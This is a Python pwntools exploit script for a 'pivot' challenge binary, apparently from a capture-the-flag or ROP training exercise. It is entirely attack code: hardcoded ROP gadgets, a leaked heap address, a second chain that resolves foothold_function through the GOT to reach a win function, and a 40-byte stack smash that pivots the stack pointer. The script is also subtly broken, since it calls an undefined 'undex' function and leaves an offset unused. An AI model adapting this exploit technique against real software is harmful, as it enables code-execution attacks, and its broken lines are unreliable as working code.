import sys
from pwn import *

elf = ELF('./pivot')
p = process('./pivot')

# Gadgets
xch_rax_rsp = 0x00000000004009bd # xchg rax, rsp ; ret
pop_rax = 0x00000000004009bb # pop rax ; ret
pop_rbp = 0x00000000004007c8 # pop rbp ; ret
pop_rsi_r15 = 0x0000000000400a31 # pop rsi ; pop r15 ; ret
mov_rax_mrax = 0x00000000004009c0 # mov rax, qword ptr [rax] ; ret
add_rax_rbp = 0x00000000004009c4 # add rax, rbp ; ret
call_rax = 0x00000000004006b0 # call rax

# Addresses
foothold_plt = elf.plt['foothold_function']
foothold_got = elf.got['foothold_function']

# Offset
foothold_offset = 0x970
ret2win_offset = 0xabe
offset = 0x14e

p.recvuntil('Call ret2win() from libpivot.so')

heap_address = p.recvline_contains('The Old Gods kindly bestow upon you a plave to pivot:').strip().rsplit(' ', 1)[-1]
heap_address = u64(undex(heap_address[2:]).rjust(8, '\x00'), endian='big')

payload2 = b''
payload2 += p64(foothold_plt)
payload2 += p64(pop_rax)
payload2 += p64(foothold_got)
payload2 += p64(mov_rax_mrax)
payload2 += p64(pop_rbp)
payload2 += p64(offset)
payload2 += p64(add_rax_rbp)
payload2 += p64(call_rax)

p.recvuntil('Send your second chain now and it will land there')
p.sendline(payload2)

payload = b'A'*40
payload += p64(pop_rax)
payload += p64(heap_address)
payload += p64(xch_rax_rsp)

p.recvuntil('Now kindly send your stack smash')
p.sendline(payload)

print(p.recvall())
